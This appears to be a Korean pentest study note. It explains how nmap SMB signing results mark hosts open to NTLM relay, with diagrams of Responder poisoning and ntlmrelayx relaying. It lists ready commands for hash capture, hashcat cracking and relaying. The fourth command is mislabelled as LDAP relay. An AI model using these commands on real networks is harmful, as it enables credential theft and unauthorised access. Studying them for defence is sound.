# NTLM 릴레이 (SMB 서명)

## 개요

nmap의 `smb-protocols` / `smb2-security-mode` 결과 해석과, 그 결과가 의미하는 NTLM 릴레이 공격 원리를 정리한다.

## nmap 확인 명령과 결과

```bash
nmap -p139,445 --script smb-protocols 192.168.236.180
nmap -p445 --script smb2-security-mode 192.168.236.180
```

결과 예시:

```text
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-protocols:
|   dialects:
|     2.0.2
|     2.1
|     3.0
|     3.0.2
|_    3.1.1
```

```text
Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

## 결과 해석

프로토콜 다이얼렉트:

- SMB1(NT1)이 목록에 없으면 SMB1 비활성 → MS17-010(EternalBlue) 불가
- 3.1.1 지원 = Windows 10 / Server 2016 이상 (또는 최신 Samba)
- SMB1이 없는 환경에서 139포트는 의미가 없다(같은 인증 정책을 거침)

서명 설정:

- `Message signing enabled but not required` → NTLM 릴레이 후보. 나중에 Responder로 해시를 획득하면 `ntlmrelayx`로 이 서버에 릴레이 가능
- `Message signing enabled and required` → 릴레이 불가. 자격증명이 있어야만 SMB 진입 가능
- 도메인 컨트롤러는 서명 required가 기본, 일반 워크스테이션/멤버서버는 not required인 경우가 많다

## NTLM 인증 원리

Windows가 비밀번호를 전송하지 않고 인증하는 방식이다.

```
클라이언트                          서버
   |--- 접속 요청 ------------------>|
   |<-- challenge (랜덤 값) ---------|
   |                                 |
   | 내 비밀번호로 challenge 계산     |
   | = NTLM 해시(response)           |
   |--- response 전송 -------------->|
   |                                 | 같은 계산으로 검증
   |<-- 인증 성공 -------------------|
```

- 전송되는 건 비밀번호가 아니라 "비밀번호로 계산한 응답값(NTLM 해시)"
- 이 해시를 가로채면 비밀번호를 몰라도 그대로 재사용할 수 있다 → 릴레이 공격의 근거

## Responder: 해시 낚시

같은 네트워크에서 Windows는 이름 해석에 실패하면 브로드캐스트(LLMNR/NBT-NS)로 서버 위치를 묻는다. Responder는 이를 가로채 거짓 응답해 인증 시도를 낚는다.

```
피해자            Responder(공격자)           진짜 서버
   |--"서버 어디?"-->|                          |
   |<--"나야!"------|                           |
   |--인증(해시)---->|   ← NTLMv2 해시 획득       |
```

## ntlmrelayx: 해시 재전송

획득한 해시를 크랙하지 않고 즉시 다른 서버에 전달해 인증한다. 피해자 A의 권한으로 B 서버에 로그인하는 효과.

```
피해자A        Responder+ntlmrelayx(공격자)      타깃 서버B
   |--해시----->|                                  |
   |            |---이 해시 그대로 인증 전달------->|
   |            |<--"인증 성공"--------------------|
   |            |   → A 권한으로 B 파일시스템 접근 등 |
```

- Responder가 낚고, ntlmrelayx가 전달한다. 세트로 사용한다.
- 크랙을 기다릴 필요가 없어 실전에서 속도가 빠르다.

## 서명이 릴레이를 막는 원리

SMB 서명 = 패킷마다 세션 키로 서명을 붙여 무결성을 보장하는 장치.

- 릴레이는 본질적으로 중간자(MITM) 공격이라 패킷을 가로채 다른 곳으로 흘려보낸다.
- 서명 required면 서버가 "서명된 패킷만 받는다"고 강제한다. 공격자는 세션 키를 몰라 서명을 만들 수 없다 → 릴레이 실패.
- 서명 not required면 서버가 서명 없는 패킷도 받아준다 → 릴레이 성립.

## 실전 명령

```bash
# 1) Responder로 해시 수집 대기
sudo responder -I tun0

# 2) 낚은 NTLMv2 해시 크랙 (mode 5600)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# 3) 릴레이 실행 (Responder의 SMB/HTTP 서버와 포트 충돌하므로 Responder 설정에서 SMB, HTTP off)
sudo impacket-ntlmrelayx -tf targets.txt -smb2support

# 4) LDAP 릴레이 예시 (AD에서 권한 남용에 사용)
sudo impacket-ntlmrelayx -tf targets.txt --no-http-server -smb2support
```

- targets.txt에는 서명 not required로 확인된 호스트를 넣는다.
- 릴레이 타깃은 피해자와 같은 호스트면 안 된다(Windows가 자기 자신으로의 릴레이를 차단).

## 정리

- `smb2-security-mode` 결과가 릴레이 가능 여부를 결정한다. 스캔 단계에서 반드시 확인하고 메모해둔다.
- `not required` 호스트 목록 + 계정·권한 정보는 이후 릴레이 공격의 재료가 된다.
